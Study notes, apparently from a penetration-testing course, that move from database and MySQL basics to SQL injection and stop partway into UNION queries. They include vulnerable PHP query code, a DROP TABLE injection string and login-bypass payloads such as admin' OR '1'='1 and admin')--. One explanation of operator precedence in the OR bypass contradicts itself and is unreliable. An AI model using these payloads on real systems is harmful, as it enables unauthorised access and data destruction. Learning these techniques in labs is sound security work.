---
title: "SQL Injection"
description: "SQL injection is a code injection technique that might destroy your database. SQL injection is one of the most common web hacking techniques."
pubDate: "May 19 2025"
heroImage: "/sqli.png"
---

# Notes on Introduction to Databases

## Overview
- **Purpose**: Understand databases and Structured Query Language (SQL) as a foundation for learning SQL injections.
- **Role in Web Applications**: Databases store critical web application data, including:
  - Core assets (e.g., images, files).
  - Content (e.g., posts, updates).
  - User data (e.g., usernames, passwords).

## Database Management Systems (DBMS)
- **Definition**: A DBMS is software that creates, defines, hosts, and manages databases.
- **Evolution**: Replaced slow file-based databases with more efficient systems.
- **Types of DBMS**:
  - Relational DBMS (RDBMS)
  - NoSQL
  - Graph-based
  - Key/Value stores
- **Interaction Methods**:
  - Command-line tools
  - Graphical interfaces
  - APIs (Application Programming Interfaces)
- **Applications**: Used in banking, finance, education, and other sectors for managing large datasets.

### Key Features of DBMS
| **Feature**               | **Description**                                                                 |
|---------------------------|---------------------------------------------------------------------------------|
| **Concurrency**           | Supports multiple users interacting simultaneously without data corruption.     |
| **Consistency**           | Ensures data remains valid and consistent during concurrent interactions.        |
| **Security**              | Provides user authentication and permissions to protect sensitive data.          |
| **Reliability**           | Enables easy backups and rollback to previous states in case of data loss/breach.|
| **Structured Query Language (SQL)** | Simplifies database interaction with intuitive syntax for various operations.   |

## Architecture
- **Two-Tiered Architecture**:
  1. **Tier I (Client-Side)**:
     - Consists of applications like websites or GUI programs.
     - Handles high-level user interactions (e.g., login, commenting).
     - Sends data to Tier II via API calls or requests.
  2. **Tier II (Middleware and DBMS)**:
     - Middleware interprets client requests and formats them for the DBMS.
     - Application layer uses specific libraries/drivers to interact with the DBMS.
     - DBMS processes queries (e.g., insert, retrieve, delete, update) and returns results or error codes.
- **Hosting**:
  - Small setups may host the application server and DBMS on the same host.
  - Large-scale databases with many users are hosted separately for better performance and scalability.

## Notes
- **Context**: This document introduces databases and DBMS as a precursor to SQL injection techniques.
- **Focus**: Emphasizes the role of SQL and DBMS in managing web application data securely and efficiently.
- **Incomplete OCR**: Diagram referenced on Page 1 is not provided; content is clear from text alone.

# Notes on Types of Databases

## Overview
- **Categories**: Databases are divided into **Relational Databases** and **Non-Relational (NoSQL) Databases**.
- **Key Difference**: Relational databases use SQL and structured schemas, while NoSQL databases use various methods for data storage and retrieval.

## Relational Databases
- **Definition**: Most common database type, using a **schema** to define the data structure.
- **Structure**: Data is stored in **tables** (entities) with rows and columns, linked by **keys**.
- **Example Scenario**: A company tracking product sales:
  - **Table 1**: Customer information (e.g., ID, name, address).
  - **Table 2**: Product details (e.g., product ID, description).
  - **Table 3**: Orders (links customer and product IDs with quantities).
- **Keys**:
  - **Primary Key**: Unique identifier for a table row (e.g., customer ID).
  - **Foreign Key**: Links tables (e.g., user_id in a posts table referencing id in a users table).
- **Relational Database Management System (RDBMS)**:
  - Manages table relationships for efficient data retrieval.
  - Widely adopted for ease of use and understanding.
  - Examples: MySQL, Microsoft Access, SQL Server, Oracle, PostgreSQL.
- **Advantages**:
  - Fast and reliable for large, structured datasets.
  - Single queries can retrieve related data across tables.
- **Schema**: Defines relationships between tables (e.g., linking users to posts via user_id).
- **Example**:
  - **Users Table**:
    | id | username | first_name | last_name |
    |----|----------|------------|-----------|
    | 1  | admin    | admin      | admin     |
    | 2  | test     | test       | test      |
    | 3  | sa       | super      | admin     |
  - **Posts Table**:
    | id | user_id | date       | content                     |
    |----|---------|------------|-----------------------------|
    | 1  | 2       | 01-01-2021 | Welcome ...                 |
    | 2  | 2       | 02-01-2021 | This is the ...             |
    | 3  | 1       | 02-01-2021 | Reminder: ...               |
  - Linking `user_id` (posts) to `id` (users) retrieves user details for each post.

## Non-Relational (NoSQL) Databases
- **Definition**: Databases without tables, rows, columns, or schemas, offering flexibility for unstructured data.
- **Storage Models**:
  1. **Key-Value**: Stores data as key-value pairs (e.g., JSON or XML).
  2. **Document-Based**: Stores data in documents (e.g., JSON, BSON).
  3. **Wide-Column**: Uses dynamic columns for large-scale data.
  4. **Graph**: Stores data as nodes and edges for relationships.
- **Advantages**:
  - Highly scalable and flexible for undefined or unstructured datasets.
- **Key-Value Example**:
  - **Table: Posts** (represented in JSON):
    ```json
    {
        "100001": {
            "date": "01-01-2021",
            "content": "Welcome to this web application."
        },
        "100002": {
            "date": "02-01-2021",
            "content": "This is the first post on this web app."
        },
        "100003": {
            "date": "02-01-2021",
            "content": "Reminder: Tomorrow is the..."
        }
    }
    ```
  - Keys (e.g., `100001`) map to values (e.g., date, content), similar to a Python/PHP dictionary.
- **Common Example**: MongoDB.

## Notes
- **Focus**: Relational databases (e.g., MySQL) are emphasized for this module due to their SQL usage and structured nature.
- **Use Cases**:
  - Relational: Best for structured data with clear relationships (e.g., customer orders).
  - NoSQL: Ideal for unstructured or rapidly changing data (e.g., social media posts).
- **Incomplete OCR**: All pages are clear; no diagrams or missing content noted.

# Notes on Introduction to MySQL and SQL

## Overview
- **Purpose**: Introduce MySQL and SQL basics to understand SQL injection techniques.
- **Focus**: Covers MySQL/MariaDB syntax, SQL commands, and database/table creation.
- **Context**: Prepares for exploiting SQL vulnerabilities by understanding database interactions.

## Structured Query Language (SQL)
- **Definition**: SQL is used to interact with Relational Database Management Systems (RDBMS).
- **Standards**: Follows ISO SQL standards, though syntax varies slightly across RDBMS (e.g., MySQL, MariaDB).
- **Actions**:
  - Retrieve data
  - Update data
  - Delete data
  - Create tables/databases
  - Manage users (add/remove)
  - Assign user permissions

## Command Line Interaction with MySQL
- **Tool**: `mysql` utility for authenticating and interacting with MySQL/MariaDB.
- **Login Syntax**:
  ```bash
  mysql -u <username> -p
  ```
  - `-u`: Specifies username (e.g., `root`).
  - `-p`: Prompts for password (avoids storing in `bash_history`).
  - Example:
    ```bash
    mysql -u root -p
    Enter password: <password>
    ```
  - **Insecure Alternative** (avoid):
    ```bash
    mysql -u root -p<password>
    ```
    - Note: No space between `-p` and password, but this risks logging the password.
- **Remote Host**:
  - Use `-h` for host and `-P` for port (default: 3306).
  - Example:
    ```bash
    mysql -u root -h docker.hackthebox.eu -P 3306 -p
    ```
  - Note: Uppercase `-P` for port, lowercase `-p` for password.
- **Privileges**:
  - Root user has full privileges.
  - Check privileges with:
    ```sql
    SHOW GRANTS;
    ```

## Creating a Database
- **Command**: `CREATE DATABASE <name>;`
  - Example:
    ```sql
    CREATE DATABASE users;
    ```
    - Output: `Query OK, 1 row affected (0.02 sec)`
- **View Databases**:
  ```sql
  SHOW DATABASES;
  ```
  - Example Output:
    ```
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | mysql              |
    | performance_schema |
    | sys                |
    | users              |
    +--------------------+
    ```
- **Switch Database**:
  ```sql
  USE users;
  ```
  - Output: `Database changed`
- **Case Sensitivity**:
  - SQL statements are case-insensitive (e.g., `USE` = `use`).
  - Database names are case-sensitive (e.g., `users` ≠ `USERS`).
  - Best practice: Use uppercase for SQL statements to avoid confusion.

## Tables
- **Definition**: Tables store data in rows (records) and columns (fields), with each cell holding a value.
- **Data Types**: Define column value types (e.g., numbers, strings, dates).
  - Common MySQL types: `INT`, `VARCHAR`, `DATETIME`.
  - Full list: MySQL documentation.
- **Creating a Table**:
  - Syntax:
    ```sql
    CREATE TABLE <name> (
        <column_name> <data_type>,
        ...
    );
    ```
  - Example:
    ```sql
    CREATE TABLE logins (
        id INT,
        username VARCHAR(100),
        password VARCHAR(100),
        date_of_joining DATETIME
    );
    ```
    - Creates a table `logins` with:
      - `id`: Integer.
      - `username`, `password`: Strings (max 100 characters).
      - `date_of_joining`: Date and time.
    - Output: `Query OK, 0 rows affected (0.03 sec)`
- **View Tables**:
  ```sql
  SHOW TABLES;
  ```
  - Example Output:
    ```
    +-------------------+
    | Tables_in_users   |
    +-------------------+
    | logins            |
    +-------------------+
    ```
- **View Table Structure**:
  ```sql
  DESCRIBE logins;
  ```
  - Example Output:
    ```
    +-----------------+--------------+
    | Field           | Type         |
    +-----------------+--------------+
    | id              | int          |
    | username        | varchar(100) |
    | password        | varchar(100) |
    | date_of_joining | datetime     |
    +-----------------+--------------+
    ```

## Table Properties
- **Purpose**: Define constraints and behaviors for columns in `CREATE TABLE`.
- **Common Properties**:
  1. **AUTO_INCREMENT**:
     - Automatically increments a column value (e.g., `id`).
     - Example:
       ```sql
       id INT NOT NULL AUTO_INCREMENT
       ```
  2. **NOT NULL**:
     - Ensures a column cannot be empty.
     - Example:
       ```sql
       username VARCHAR(100) NOT NULL
       ```
  3. **UNIQUE**:
     - Ensures column values are unique.
     - Example:
       ```sql
       username VARCHAR(100) UNIQUE NOT NULL
       ```
  4. **DEFAULT**:
     - Sets a default value for a column.
     - Example:
       ```sql
       date_of_joining DATETIME DEFAULT NOW()
       ```
       - `NOW()`: Returns current date and time.
  5. **PRIMARY KEY**:
     - Uniquely identifies each record; typically used with `id`.
     - Example:
       ```sql
       PRIMARY KEY (id)
       ```
- **Final Table Example**:
  ```sql
  CREATE TABLE logins (
      id INT NOT NULL AUTO_INCREMENT,
      username VARCHAR(100) UNIQUE NOT NULL,
      password VARCHAR(100) NOT NULL,
      date_of_joining DATETIME DEFAULT NOW(),
      PRIMARY KEY (id)
  );
  ```
  - Creates a `logins` table with:
    - Auto-incrementing, non-empty `id` as the primary key.
    - Unique, non-empty `username`.
    - Non-empty `password`.
    - `date_of_joining` defaulting to the current timestamp.

## Notes
- **Security**:
  - Avoid passing passwords directly in commands to prevent logging in `bash_history`.
  - Use `-p` to prompt for passwords.
- **Practice**:
  - Use `mysql` on PwnBox to connect to a DBMS with:
    - Username: `root`
    - Password: `password`
    - IP/port provided in the module’s question.
- **MySQL/MariaDB**:
  - Default port: 3306 (configurable).
  - Examples use MySQL/MariaDB syntax.
- **Incomplete OCR**: All pages are clear; no missing content or diagrams noted.

# Notes on SQL Statements

## Overview
- **Purpose**: Covers essential SQL statements for interacting with MySQL/MariaDB databases, building on prior knowledge of database and table creation.
- **Focus**: Demonstrates syntax and examples for `INSERT`, `SELECT`, `DROP`, `ALTER`, and `UPDATE` statements.

## INSERT Statement
- **Purpose**: Adds new records to a table.
- **Syntax**:
  ```sql
  INSERT INTO table_name VALUES (column1_value, column2_value, ...);
  ```
  - Requires values for all columns unless defaults are set.
- **Example**:
  ```sql
  INSERT INTO logins VALUES (1, 'admin', 'p8ssw0rd', '2020-07-02');
  ```
  - Output: `Query OK, 1 row affected (0.00 sec)`
  - Adds a record to the `logins` table with all column values.
- **Selective Insert**:
  - Specify only certain columns, skipping those with defaults or allowing `NULL`.
  - Syntax:
    ```sql
    INSERT INTO table_name (column2, column3, ...) VALUES (column2_value, column3_value, ...);
    ```
  - Example:
    ```sql
    INSERT INTO logins (username, password) VALUES ('administrator', 'admin_p@ss');
    ```
    - Skips `id` (auto-incremented) and `date_of_joining` (default `NOW()`).
    - Note: Columns with `NOT NULL` constraints must be included or an error occurs.
- **Multiple Records**:
  - Insert multiple records in one query by separating with commas.
  - Example:
    ```sql
    INSERT INTO logins (username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
    ```
    - Output: `Query OK, 2 rows affected (0.00 sec)`
- **Security Note**: Storing cleartext passwords (as shown) is bad practice; passwords should be hashed/encrypted.

## SELECT Statement
- **Purpose**: Retrieves data from a table.
- **Syntax**:
  ```sql
  SELECT * FROM table_name;
  ```
  - `*`: Wildcard to select all columns.
- **Example**:
  ```sql
  SELECT * FROM logins;
  ```
  - Output:
    ```
    +----+--------------+-----------------+---------------------+
    | id | username     | password        | date_of_joining     |
    +----+--------------+-----------------+---------------------+
    | 1  | admin        | p8ssw0rd        | 2020-07-02 00:00:00 |
    | 2  | administrator| admin_p@ss      | 2020-07-02 11:30:50 |
    | 3  | john         | john123!        | 2020-07-02 11:47:16 |
    | 4  | tom          | tom123!         | 2020-07-02 11:47:16 |
    +----+--------------+-----------------+---------------------+
    4 rows in set (0.00 sec)
    ```
- **Selective Columns**:
  - Specify columns to retrieve.
  - Syntax:
    ```sql
    SELECT column1, column2 FROM table_name;
    ```
  - Example:
    ```sql
    SELECT username, password FROM logins;
    ```
    - Output:
      ```
      +--------------+-----------------+
      | username     | password        |
      +--------------+-----------------+
      | admin        | p8ssw0rd        |
      | administrator| admin_p@ss      |
      | john         | john123!        |
      | tom          | tom123!         |
      +--------------+-----------------+
      4 rows in set (0.00 sec)
      ```

## DROP Statement
- **Purpose**: Permanently deletes tables or databases.
- **Syntax**:
  ```sql
  DROP TABLE table_name;
  ```
- **Example**:
  ```sql
  DROP TABLE logins;
  ```
  - Output: `Query OK, 0 rows affected (0.01 sec)`
  - Verifying:
    ```sql
    SHOW TABLES;
    ```
    - Output: `Empty set (0.00 sec)`
- **Caution**: `DROP` is irreversible with no confirmation; use carefully.

## ALTER Statement
- **Purpose**: Modifies table structure (e.g., add, rename, modify, or drop columns).
- **Syntax Examples**:
  1. **Add Column**:
     ```sql
     ALTER TABLE table_name ADD column_name data_type;
     ```
     - Example:
       ```sql
       ALTER TABLE logins ADD newColumn INT;
       ```
       - Output: `Query OK, 0 rows affected (0.01 sec)`
  2. **Rename Column**:
     ```sql
     ALTER TABLE table_name RENAME COLUMN old_name TO new_name;
     ```
     - Example:
       ```sql
       ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
       ```
       - Output: `Query OK, 0 rows affected (0.01 sec)`
  3. **Modify Column Data Type**:
     ```sql
     ALTER TABLE table_name MODIFY column_name new_data_type;
     ```
     - Example:
       ```sql
       ALTER TABLE logins MODIFY newerColumn DATE;
       ```
       - Output: `Query OK, 0 rows affected (0.01 sec)`
  4. **Drop Column**:
     ```sql
     ALTER TABLE table_name DROP column_name;
     ```
     - Example:
       ```sql
       ALTER TABLE logins DROP newerColumn;
       ```
       - Output: `Query OK, 0 rows affected (0.01 sec)`
- **Note**: Requires sufficient privileges to modify tables.

## UPDATE Statement
- **Purpose**: Updates specific records in a table based on conditions.
- **Syntax**:
  ```sql
  UPDATE table_name SET column1 = new_value1, column2 = new_value2, ... WHERE condition;
  ```
- **Example**:
  ```sql
  UPDATE logins SET password = 'change_password' WHERE id > 1;
  ```
  - Output: `Query OK, 3 rows affected (0.00 sec)`
  - Verifying:
    ```sql
    SELECT * FROM logins;
    ```
    - Output:
      ```
      +----+--------------+-----------------+---------------------+
      | id | username     | password        | date_of_joining     |
      +----+--------------+-----------------+---------------------+
      | 1  | admin        | p8ssw0rd        | 2020-07-02 00:00:00 |
      | 2  | administrator| change_password | 2020-07-02 11:30:50 |
      | 3  | john         | change_password | 2020-07-02 11:47:16 |
      | 4  | tom          | change_password | 2020-07-02 11:47:16 |
      +----+--------------+-----------------+---------------------+
      4 rows in set (0.00 sec)
      ```
- **Note**: The `WHERE` clause is critical to specify which records to update; omitting it updates all records.

# Notes on Query Results

## Overview
- **Purpose**: Explains how to control and filter SQL query results in MySQL/MariaDB using sorting, limiting, and conditional clauses.
- **Focus**: Covers `ORDER BY`, `LIMIT`, and `WHERE` clauses to manipulate query output.

## Sorting Results with ORDER BY
- **Purpose**: Sorts query results based on one or more columns.
- **Syntax**:
  ```sql
  SELECT * FROM table_name ORDER BY column_name [ASC|DESC];
  ```
  - `ASC`: Ascending order (default).
  - `DESC`: Descending order.
- **Example**:
  ```sql
  SELECT * FROM logins ORDER BY password;
  ```
  - Sorts `logins` table by `password` in ascending order.
  - Output: `4 rows in set (0.00 sec)`
- **Multiple Columns**:
  - Sorts by multiple columns for secondary sorting (e.g., when primary column has duplicates).
  - Example:
    ```sql
    SELECT * FROM logins ORDER BY password DESC, id ASC;
    ```
    - Primary sort: `password` in descending order.
    - Secondary sort: `id` in ascending order for duplicate passwords.
    - Output: `4 rows in set (0.00 sec)`

## Limiting Results with LIMIT
- **Purpose**: Restricts the number of records returned by a query.
- **Syntax**:
  ```sql
  SELECT * FROM table_name LIMIT count;
  ```
- **Example**:
  ```sql
  SELECT * FROM logins LIMIT 2;
  ```
  - Returns only the first 2 records.
  - Output: `2 rows in set (0.00 sec)`
- **Offset with LIMIT**:
  - Skips a specified number of records before returning results.
  - Syntax:
    ```sql
    SELECT * FROM table_name LIMIT offset, count;
    ```
  - Example:
    ```sql
    SELECT * FROM logins LIMIT 1, 2;
    ```
    - Offset `1`: Starts from the 2nd record (offset is 0-based).
    - Returns 2 records.
    - Output: `2 rows in set (0.00 sec)`

## Filtering Results with WHERE Clause
- **Purpose**: Filters records based on specific conditions.
- **Syntax**:
  ```sql
  SELECT * FROM table_name WHERE condition;
  ```
- **Example**:
  ```sql
  SELECT * FROM logins WHERE id > 1;
  ```
  - Returns records where `id` is greater than 1 (skips `id = 1`).
  - Output: `2 rows in set (0.00 sec)`
- **String Filtering**:
  - Example:
    ```sql
    SELECT * FROM logins WHERE username = 'admin';
    ```
    - Returns records where `username` is exactly `admin`.
- **Wildcard Filtering with LIKE**:
  - `%`: Matches zero or more characters.
  - `_`: Matches exactly one character.
  - Example:
    ```sql
    SELECT * FROM logins WHERE username LIKE 'admin%';
    ```
    - Matches usernames starting with `admin` (e.g., `admin`, `administrator`).
  - Example:
    ```sql
    SELECT * FROM logins WHERE username LIKE '___';
    ```
    - Matches usernames with exactly 3 characters (e.g., `tom`).
    - Output: Returns record for `tom`.

# Notes on SQL Operators

## Overview
- **Purpose**: Introduces SQL logical operators (`AND`, `OR`, `NOT`) and operator precedence to handle complex conditions in MySQL/MariaDB queries.
- **Focus**: Demonstrates how to combine conditions and understand evaluation order for precise query results.

## Logical Operators
- **Role**: Enable multiple conditions in SQL queries for advanced filtering.
- **Common Operators**:
  - `AND`: True if both conditions are true.
  - `OR`: True if at least one condition is true.
  - `NOT`: Negates a condition’s result.
- **MySQL Truth Values**:
  - Non-zero (e.g., `1`) = True.
  - Zero (`0`) = False.

### AND Operator
- **Syntax**:
  ```sql
  condition1 AND condition2
  ```
  - Returns `1` (true) only if both conditions are true; otherwise, `0` (false).
- **Example**:
  ```sql
  SELECT 1 = 1 AND 'test' = 'test';
  ```
  - Output: `1` (true, both conditions are true).
  ```sql
  SELECT 1 = 1 AND 'test' = 'abc';
  ```
  - Output: `0` (false, second condition is false).

### OR Operator
- **Syntax**:
  ```sql
  condition1 OR condition2
  ```
  - Returns `1` (true) if at least one condition is true; `0` if both are false.
- **Example**:
  ```sql
  SELECT 1 = 1 OR 'test' = 'abc';
  ```
  - Output: `1` (true, first condition is true).

### NOT Operator
- **Syntax**:
  ```sql
  NOT condition
  ```
  - Returns `1` (true) if the condition is false; `0` (false) if true.
- **Example**:
  ```sql
  SELECT NOT 1 = 1;
  ```
  - Output: `0` (false, `1 = 1` is true, so `NOT` negates it).

### Combined Example
- **Query**:
  ```sql
  SELECT * FROM logins WHERE username != 'john' AND id > 1;
  ```
  - Filters `logins` table for records where:
    - `username` is not `john`.
    - `id` is greater than `1`.
  - Output: `2 rows in set (0.00 sec)` (e.g., records for `administrator` and others meeting both conditions).

## Operator Precedence
- **Purpose**: Determines the order in which operations are evaluated in complex queries.
- **Precedence List** (from MariaDB documentation, highest to lowest):
  1. Division (`/`), Multiplication (`*`), Modulus (`%`)
  2. Addition (`+`), Subtraction (`-`)
  3. Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
  4. `NOT`
  5. `AND` (`&&`)
  6. `OR` (`||`)
- **Evaluation**: Higher-precedence operations are executed first; same-precedence operations are evaluated left to right.

### Precedence Example
- **Query**:
  ```sql
  SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
  ```
- **Step-by-Step Evaluation**:
  1. **Subtraction** (highest precedence):
     - `3 - 2` evaluates to `1`.
     - Query becomes:
       ```sql
       SELECT * FROM logins WHERE username != 'tom' AND id > 1;
       ```
  2. **Comparison** (`!=` and `>` have equal precedence):
     - Evaluates `username != 'tom'` and `id > 1` simultaneously.
  3. **AND**:
     - Combines results, returning records where both conditions are true.
- **Output**:
  ```
  +----+----------------+--------------+---------------------+
  | id | username       | password     | date_of_joining     |
  +----+----------------+--------------+---------------------+
  | 2  | administrator  | admin_p@ss   | 2020-07-03 12:03:53 |
  | 3  | john           | john123!     | 2020-07-03 12:03:57 |
  +----+----------------+--------------+---------------------+
  2 rows in set (0.00 sec)
  ```

# Notes on Introduction to SQL Injections

## Overview
- **Purpose**: Introduces SQL injection vulnerabilities in MySQL, focusing on how they exploit unsanitized user input in web applications.
- **Focus**: Explains how web applications interact with MySQL, the mechanics of SQL injection, and types of SQL injections, with emphasis on Union-Based SQL injection.

## Use of SQL in Web Applications
- **Context**: Web applications use MySQL databases to store and retrieve data, typically on a back-end server.
- **Example (PHP)**:
  - Connect to MySQL and execute a query:
    ```php
    $conn = new MySQL("localhost", "root", "password", "users");
    $query = "select * from logins";
    $result = $conn->query($query);
    ```
    - Stores query results in `$result`.
  - Display results:
    ```php
    while ($row = $result->fetch_assoc()) {
        echo $row["name"]. "<br>";
    }
    ```
    - Prints each row’s `name` column with HTML line breaks.
- **User Input in Queries**:
  - Web applications often incorporate user input (e.g., search terms) into SQL queries.
  - Example:
    ```php
    $searchInput = $_POST['findUser'];
    $query = "select * from logins where username like '%$searchInput'";
    $result = $conn->query($query);
    ```
    - Vulnerable to SQL injection if `$searchInput` is not sanitized.

## What is an Injection?
- **Definition**: Occurs when user input is misinterpreted as code rather than data, altering the application’s logic.
- **Mechanism**: Attackers use special characters (e.g., single quotes) to escape input boundaries and inject malicious code.
- **Sanitization**: Removes or escapes special characters to prevent injection.
  - Without sanitization, injected code (e.g., SQL or JavaScript) may execute.

## SQL Injection
- **Definition**: Exploits unsanitized user input in SQL queries to manipulate database operations.
- **Vulnerable Example**:
  ```php
  $searchInput = $_POST['findUser'];
  $query = "select * from logins where username like '%$searchInput'";
  $result = $conn->query($query);
  ```
  - SQL Query:
    ```sql
    select * from logins where username like '%$searchInput'
    ```
  - Normal Input (e.g., `admin`):
    - Becomes: `select * from logins where username like '%admin'`
    - Searches for usernames containing `admin`.
  - Malicious Input (e.g., `1'; DROP TABLE users; --`):
    - Becomes:
      ```sql
      select * from logins where username like '%1'; DROP TABLE users; --'
      ```
    - Single quote (`'`) escapes the input boundary.
    - `DROP TABLE users;` attempts to delete the `users` table.
    - `--` comments out the trailing quote to avoid syntax errors.
- **Note**: The example uses a semicolon (`;`) to chain queries, which works in MSSQL/PostgreSQL but not MySQL. MySQL injection techniques are discussed later.

## Syntax Errors in SQL Injection
- **Issue**: Injected queries may cause syntax errors if not crafted carefully.
  - Example (with trailing quote):
    ```sql
    select * from logins where username like '%1'; DROP TABLE users;'
    ```
    - Error: `near "'": syntax error` due to unclosed quote.
- **Challenges**:
  - User input often appears mid-query, with additional SQL following.
  - Attackers typically lack access to the original query, complicating injection.
- **Solutions**:
  - Use comments (e.g., `--` or `#`) to neutralize trailing query parts (covered later).
  - Balance quotes (e.g., add multiple single quotes) to maintain valid syntax.

## Types of SQL Injections
- **Categories**:
  1. **In-Band**: Output is directly visible on the front-end.
     - **Union-Based**: Injects `UNION` to combine malicious query results with the original, directing output to specific columns.
     - **Error-Based**: Triggers SQL errors to leak query results via error messages.
  2. **Blind**: No direct output; results inferred indirectly.
     - **Boolean-Based**: Uses conditional statements to control page output (e.g., true/false responses).
     - **Time-Based**: Uses delays (e.g., `SLEEP`) to infer results based on response time.
  3. **Out-of-Band**: Sends results to a remote location (e.g., DNS records) for retrieval.
- **Module Focus**: Union-Based SQL injection.

# Notes on Subverting Query Logic

## Overview
- **Purpose**: Demonstrates SQL injection techniques to bypass authentication by manipulating query logic using the `OR` operator and comments in MySQL.
- **Focus**: Focuses on authentication bypass by injecting payloads to alter the logic of SQL queries, ensuring valid syntax to avoid errors.

## Authentication Bypass
- **Context**: Targets an admin login page that authenticates users via a SQL query.
- **Example Query**:
  ```sql
  SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd';
  ```
  - Checks if both `username` and `password` match; returns records if true, allowing login.
- **Success Case**:
  - Input: `username=admin`, `password=p@ssw0rd`
  - Output: `Login successful as user: admin`
- **Failure Case**:
  - Input: `username=admin`, `password=admin`
  - Query: `SELECT * FROM logins WHERE username='admin' AND password='admin';`
  - Output: `Login failed!` (password mismatch results in false `AND` condition).

## SQL Injection Discovery
- **Purpose**: Test if the login form is vulnerable to SQL injection by injecting payloads to detect errors or behavior changes.
- **Payloads** (with URL-encoded versions for HTTP GET requests):
  - `'` (`%27`)
  - `"` (`%22`)
  - `#` (`%23`)
  - `%` (`%25`)
  - `)` (`%29`)
- **Test Example**:
  - Input: `username='`, `password=something`
  - Query: `SELECT * FROM logins WHERE username='' AND password='something';`
  - Output: SQL syntax error (`near 'something' at line 1`).
    - Caused by an odd number of quotes, breaking query syntax.
- **Implication**: Error confirms vulnerability, as unsanitized input affects query execution.

## OR Injection
- **Goal**: Bypass authentication by making the query always return true, regardless of credentials.
- **Technique**: Use the `OR` operator to introduce a condition that is always true (e.g., `'1'='1'`).
- **Operator Precedence** (from MySQL/MariaDB):
  - `AND` is evaluated before `OR`.
  - Ensures `OR` can override `AND` conditions if one operand is true.
- **Payload**:
  - Input: `username=admin' OR '1'='1`, `password=something`
  - Query:
    ```sql
    SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password='something';
    ```
  - Logic:
    - `username='admin'` (true if `admin` exists).
    - `'1'='1'` (always true).
    - `password='something'` (likely false).
    - Evaluation: `(username='admin' OR '1'='1') AND password='something'`
      - `OR` condition is true (`'1'='1'`).
      - `AND` with false password condition may still allow login if records are returned.
- **Syntax Management**:
  - Payload uses `'1'='1` (no closing quote) to balance quotes with the original query’s trailing quote, avoiding syntax errors.
- **Failure Case**:
  - Input: `username=notAdmin' OR '1'='1`, `password=something`
  - Query: `SELECT * FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something';`
  - Output: `Login failed!`
    - `notAdmin` doesn’t exist, and query logic evaluates to false overall.

## Notes
- **Key Insight**:
  - `OR` injection exploits low-precedence of `OR` to make queries return true.
  - Proper quote balancing is critical to avoid syntax errors.
- **Limitations**:
  - Success depends on returning valid records (e.g., `admin` must exist).
  - MySQL’s single-query limitation prevents chaining additional queries (unlike MSSQL/PostgreSQL).
- **Security**:
  - Sanitize inputs to prevent injection.
  - Avoid exposing SQL errors on the front-end, as they confirm vulnerabilities.
- **Incomplete OCR**:
  - Page 2 has minor errors (e.g., `loqins` should be `logins`, `g@ssw0nt` should be `p@ssw0rd`, `$w_2$` is unclear).
  - Pages 4–5 contain repetitive `True`/`False` outputs, likely OCR artifacts, but key content is intact.
  - No diagrams or missing critical content noted.

# Notes on Using Comments

## Overview
- **Purpose**: Explains how to use SQL comments (`--`, `#`, `/* */`) to subvert query logic in MySQL for authentication bypass in SQL injection attacks.
- **Focus**: Demonstrates manipulating complex SQL queries by commenting out parts to bypass conditions, ensuring valid syntax.

## Comments
- **Role**: Used to document or ignore parts of SQL queries.
- **Types in MySQL**:
  - Line comments: `--` (requires a space after, e.g., `-- `, URL-encoded as `--+`) and `#`.
  - Inline comment: `/* */` (less common in SQL injections).
- **Example**:
  ```sql
  SELECT username FROM logins; -- Selects usernames from the logins table
  ```
  - Output: Returns usernames (`admin`, `administrator`, `john`, `tom`).
  ```sql
  SELECT * FROM logins WHERE username='admin'; # You can place anything here AND pas
  ```
  - Ignores everything after `#`, returns `admin` record.

## Auth Bypass with Comments
- **Scenario**: Bypass login authentication by commenting out query conditions.
- **Example Query**:
  ```sql
  SELECT * FROM logins WHERE username='admin' AND password='something';
  ```
- **Payload**:
  - Input: `username=admin--`, `password=a`
  - Query:
    ```sql
    SELECT * FROM logins WHERE username='admin' -- AND password='a';
    ```
  - Effect: Comments out `AND password='a'`, checks only `username='admin'`.
  - Output: `Login successful as user: admin`.
- **Key**: Ensures no syntax errors by commenting out the rest of the query.

## Another Example
- **Scenario**: Query with parentheses and hashed password:
  ```sql
  SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='437b930db84b8079c2dd804a71936b5f';
  ```
  - Parentheses enforce `username='admin' AND id > 1` evaluation first.
  - Hashed password prevents injection via password field.
- **Valid Credentials Test**:
  - Input: `username=admin`, `password=p@ssword`
  - Query: `SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='0f359740bd1eda994f8b55330c86d845';`
  - Output: `Login failed!` (`admin` has `id=1`, fails `id > 1`).
  - Input: `username=tom`, `password=[valid]`
  - Query: `SELECT * FROM logins WHERE (username='tom' AND id > 1) AND password='f66a3c565937e631515864d1a43c48e7';`
  - Output: `Login successful as user: tom` (`tom` has `id > 1`).
- **Injection Attempt**:
  - Input: `username=admin--`, `password=[any]`
  - Query: `SELECT * FROM logins WHERE (username='admin' -- AND id > 1) AND password='437b930db84b8079c2dd804a71936b5f';`
  - Output: Syntax error (unclosed parenthesis).
  - Corrected Input: `username=admin')--`, `password=[any]`
  - Query:
    ```sql
    SELECT * FROM logins WHERE (username='admin') -- AND id > 1) AND password='437b930db84b8079c2dd804a71936b5f';
    ```
  - Effect: Closes parenthesis, comments out remaining conditions, becomes `SELECT * FROM logins WHERE (username='admin')`.
  - Output: `Login successful as user: admin`.

# Notes on Union Clause

## Overview
- **Purpose**: Introduces SQL Union clause and its use in SQL injection to execute additional queries and extract data from multiple tables in MySQL.
- **Focus**: Demonstrates combining `SELECT` statements with `UNION` and handling column mismatches for effective Union-based SQL injection.

## Union
- **Role**: Combines results from multiple `SELECT` statements into a single output.
- **Requirement**: All `SELECT` statements must have the same number of columns with matching data types.
- **Example**:
  - Tables:
    - `ports`: Columns `code`, `city` (e.g., `CN SHA | Shanghai`, `SG SIN | Singapore`, `ZZ-21 | Shenzhen`).
    - `ships`: Columns `ship`, `city` (e.g., `Morrison | New York`).
  - Query:
    ```sql
    SELECT * FROM ports UNION SELECT * FROM ships;
    ```
  - Output:
    ```
    | code      | city      |
    | CN SHA    | Shanghai  |
    | SG SIN    | Singapore |
    | Morrison  | New York  |
